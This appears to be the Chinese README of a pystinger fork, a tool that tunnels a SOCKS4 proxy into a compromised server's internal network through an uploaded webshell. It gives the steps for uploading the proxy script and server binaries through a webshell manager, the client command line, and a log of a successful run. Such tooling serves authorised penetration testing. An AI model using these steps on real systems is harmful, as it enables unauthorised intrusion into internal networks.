# 毒刺(pystinger_for_darkshadow)
毒刺(pystinger_for_darkshadow)是一个通过webshell实现**内网SOCK4代理出网**.工具主体使用python开发,当前支持php,jsp(x),aspx三种代理脚本.
如需使用端口转发功能请使用pystinger原版
# 使用方法

## SOCK4代理
* proxy.php上传到目标服务器,确保 [http://192.168.3.11:8080/proxy.jsp](http://192.168.3.11:8080/proxy.jsp)可以访问,页面返回 stinger XXX!
* 将stinger_server.exe和stinger_server.vbs上传到目标服务器,菜刀(蚁剑)执行```stinger_server.vbs```启动服务端
(修改vbs中路径,不要直接运行exe文件,会导致tcp断连)
* stinger_client命令行执行```./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 0.0.0.0 -p 60000```,生成如下输出表示成功
```
root@kali:~# ./stinger_client -w http://192.168.3.11:8080/proxy.jsp -l 0.0.0.0 -p 60000
2019-12-08 21:53:10,207 - INFO - 468 - Local listen check pass.
2019-12-08 21:53:10,207 - INFO - 469 - Socks4a on 0.0.0.0:60000
2019-12-08 21:53:10,217 - INFO - 478 - WEBSHELL check pass.
2019-12-08 21:53:10,218 - INFO - 479 - http://192.168.3.11:8080/proxy.jsp
2019-12-08 21:53:10,226 - INFO - 490 - REMOTE_SERVER check pass.
2019-12-08 21:53:10,226 - INFO - 491 - --- Sever Config ---
2019-12-08 21:53:10,226 - INFO - 493 - client_address_list => []
2019-12-08 21:53:10,226 - INFO - 493 - SERVER_LISTEN => 127.0.0.1:60010
2019-12-08 21:53:10,227 - INFO - 493 - READ_BUFF_SIZE => 51200
2019-12-08 21:53:10,227 - INFO - 493 - LOG_LEVEL => INFO
2019-12-08 21:53:10,227 - INFO - 506 - SLEEP_TIME : 0.01
2019-12-08 21:53:10,227 - WARNING - 90 - LoopThread start
2019-12-08 21:53:10,229 - WARNING - 370 - socks4a server start on 0.0.0.0:60000
2019-12-08 21:53:10,232 - WARNING - 377 - Socks4a ready to accept

```
* 此时已经在本地60000启动了一个192.168.3.11所在内网的socks4代理
# 相关工具
[https://github.com/nccgroup/ABPTTS](https://github.com/nccgroup/ABPTTS)

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

[https://github.com/SECFORCE/Tunna](https://github.com/SECFORCE/Tunna)
# 已测试
## stinger_server\stinger_client
* windows 
* linux
## proxy.jsp(x)/php/aspx
* php7.2 
* tomcat7.0 
* iis8.0

# 更新日志
**2.0**
更新时间: 2019-09-29
* 将socks4代理服务移动到客户端
* 不再支持端口转发功能


